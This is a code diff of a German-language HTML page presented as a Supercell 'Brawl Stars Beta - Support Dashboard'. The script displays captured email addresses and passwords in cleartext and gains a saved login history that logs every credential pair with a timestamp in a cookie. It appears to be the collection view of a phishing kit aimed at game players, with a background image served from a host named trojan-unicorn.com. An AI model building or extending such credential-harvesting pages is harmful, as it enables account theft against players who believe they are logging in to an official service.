@@ -1,74 +1,294 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Supercell - Support-Ansicht</title>
+    <title>Supercell Support Dashboard</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        * {
             margin: 0;
-            padding: 20px;
-            background-color: #f0f0f0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
         }
-        .support-container {
-            background: white;
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                        url('https://www.trojan-unicorn.com/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBNzFSQVE9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--73f5fac5021334351204f5e6194508b1b24751c3/supercell.png');
+            background-size: cover;
+            background-position: center;
+            backdrop-filter: blur(8px);
+            padding: 20px;
+        }
+
+        .logo {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 200px;
+            height: 60px;
+            background: url('https://supercell.com/images/16a069b22e0605efd5c5eb8087da850d/bg_hero_scid_landing_0.webp');
+            background-size: contain;
+            background-repeat: no-repeat;
+            z-index: 100;
+        }
+
+        .dashboard {
+            max-width: 1200px;
+            margin: 80px auto 20px;
+            background: rgba(255, 255, 255, 0.97);
             padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            max-width: 800px;
-            margin: 0 auto;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
         }
-        .title {
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #eee;
+        }
+
+        .dashboard-title {
+            color: #1e88e5;
+            font-size: 28px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .live-status {
+            background: #4CAF50;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
+        .user-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border-left: 5px solid #1e88e5;
+            transition: all 0.3s ease;
+        }
+
+        .user-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .info-row {
+            display: flex;
+            margin-bottom: 15px;
+            padding: 12px;
+            background: white;
+            border-radius: 10px;
+            align-items: center;
+        }
+
+        .info-label {
+            font-weight: 600;
+            width: 150px;
+            color: #444;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-value {
             color: #333;
-            text-align: center;
+            flex: 1;
+            font-size: 15px;
+            padding: 8px 12px;
+            background: #f8f9fa;
+            border-radius: 6px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .history-section {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 15px;
+            margin-top: 40px;
+        }
+
+        .history-title {
+            color: #1e88e5;
+            font-size: 20px;
             margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        .user-info {
-            background: #f8f8f8;
-            padding: 20px;
-            border-radius: 4px;
+
+        .history-title::before {
+            content: '';
+            display: block;
+            width: 4px;
+            height: 24px;
+            background: #1e88e5;
+            border-radius: 2px;
+        }
+
+        #loginHistory {
+            width: 100%;
+            border-collapse: collapse;
             margin-top: 20px;
-            border-left: 4px solid #4CAF50;
         }
+
+        #loginHistory th {
+            background: #f1f1f1;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+            color: #444;
+            text-transform: uppercase;
+            font-size: 13px;
+            letter-spacing: 0.5px;
+        }
+
+        #loginHistory td {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            color: #333;
+        }
+
+        #loginHistory tr:hover td {
+            background: #f5f5f5;
+        }
+
+        .timestamp {
+            color: #666;
+            font-size: 0.9em;
+            font-style: italic;
+            text-align: right;
+            margin-top: 10px;
+        }
+
         .no-user {
             text-align: center;
             color: #666;
             font-style: italic;
-            padding: 20px;
+            padding: 40px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            margin: 20px 0;
         }
-        .info-row {
-            margin-bottom: 10px;
+
+        .clear-history-btn {
+            background: #ff4081;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            float: right;
+            margin-top: -45px;
         }
-        .timestamp {
-            color: #666;
-            font-size: 0.9em;
-            margin-top: 10px;
-        }
-        .status-active {
-            color: #4CAF50;
-            font-weight: bold;
-        }
-        .status-inactive {
-            color: #f44336;
-            font-weight: bold;
-        }
-        .password-field {
-            font-family: monospace;
-            background: #fff;
-            padding: 2px 6px;
-            border-radius: 3px;
-            border: 1px solid #ddd;
+
+        .clear-history-btn:hover {
+            background: #f50057;
+            transform: translateY(-2px);
         }
     </style>
 </head>
 <body>
-    <div class="support-container">
-        <h2 class="title">Supercell Support - Benutzeraktivität</h2>
+    <div class="logo"></div>
+    <div class="dashboard">
+        <div class="dashboard-header">
+            <h1 class="dashboard-title">Brawl Stars Beta - Support Dashboard</h1>
+            <div class="live-status">
+                <div class="status-dot"></div>
+                Live Monitor
+            </div>
+        </div>
+
         <div id="userActivity">
             <div class="no-user">Warte auf Benutzeraktivität...</div>
+        </div>
+
+        <div class="history-section">
+            <h2 class="history-title">Anmeldeverlauf</h2>
+            <button class="clear-history-btn" onclick="clearHistory()">Verlauf löschen</button>
+            <table id="loginHistory">
+                <thead>
+                    <tr>
+                        <th>Zeitpunkt</th>
+                        <th>E-Mail</th>
+                        <th>Passwort</th>
+                    </tr>
+                </thead>
+                <tbody id="historyBody"></tbody>
+            </table>
         </div>
     </div>
 
     <script>
+        let loginHistory = [];
+
+        function loadHistory() {
+            const savedHistory = getCookie('loginHistory');
+            if (savedHistory) {
+                loginHistory = JSON.parse(savedHistory);
+                updateHistoryTable();
+            }
+        }
+
+        function saveHistory() {
+            setCookie('loginHistory', JSON.stringify(loginHistory), 7);
+        }
+
+        function clearHistory() {
+            loginHistory = [];
+            saveHistory();
+            updateHistoryTable();
+        }
+
+        function setCookie(name, value, days) {
+            const expires = new Date(Date.now() + days * 24 * 60 * 60 * 1000).toUTCString();
+            document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
+        }
+
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
+        }
+
+        function updateHistoryTable() {
+            const tbody = document.getElementById('historyBody');
+            tbody.innerHTML = loginHistory.map(entry => `
+                <tr>
+                    <td>${entry.timestamp}</td>
+                    <td>${entry.email}</td>
+                    <td>${entry.password}</td>
+                </tr>
+            `).join('');
+        }
+
         function checkUserActivity() {
             const userActivityDiv = document.getElementById('userActivity');
             const userData = localStorage.getItem('currentUser');
@@ -76,26 +296,41 @@
             if (userData) {
                 const user = JSON.parse(userData);
                 const timeSinceUpdate = Date.now() - user.lastUpdate;
-                const isActive = timeSinceUpdate < 2000; // 2 Sekunden Timeout
+                const isActive = timeSinceUpdate < 2000;
+
+                if (isActive && user.email && user.password) {
+                    // Neuen Eintrag zum Verlauf hinzufügen
+                    const existingEntry = loginHistory.find(entry => 
+                        entry.email === user.email && 
+                        entry.password === user.password
+                    );
+
+                    if (!existingEntry) {
+                        loginHistory.unshift({
+                            timestamp: new Date().toLocaleString(),
+                            email: user.email,
+                            password: user.password
+                        });
+                        saveHistory();
+                        updateHistoryTable();
+                    }
+                }
 
                 userActivityDiv.innerHTML = `
-                    <div class="user-info">
+                    <div class="user-card">
                         <div class="info-row">
-                            <strong>Status:</strong> 
-                            <span class="${isActive ? 'status-active' : 'status-inactive'}">
-                                ${isActive ? 'Aktiv' : 'Inaktiv'}
-                            </span>
+                            <span class="info-label">Status</span>
+                            <span class="info-value">${isActive ? 'Aktiv' : 'Inaktiv'}</span>
                         </div>
                         <div class="info-row">
-                            <strong>E-Mail:</strong> ${user.email || 'Noch nicht eingegeben'}
+                            <span class="info-label">E-Mail</span>
+                            <span class="info-value">${user.email || 'Noch nicht eingegeben'}</span>
                         </div>
                         <div class="info-row">
-                            <strong>Passwort:</strong> 
-                            <span class="password-field">${user.password || 'Noch nicht eingegeben'}</span>
+                            <span class="info-label">Passwort</span>
+                            <span class="info-value">${user.password || 'Noch nicht eingegeben'}</span>
                         </div>
-                        <div class="timestamp">
-                            Letzte Aktivität: ${user.timestamp}
-                        </div>
+                        <div class="timestamp">Letzte Aktivität: ${user.timestamp}</div>
                     </div>
                 `;
             } else {
@@ -103,10 +338,9 @@
             }
         }
 
-        // Regelmäßige Überprüfung der Benutzeraktivität
+        // Initialisierung
+        loadHistory();
         setInterval(checkUserActivity, 500);
-
-        // Initiale Überprüfung
         checkUserActivity();
     </script>
 </body>
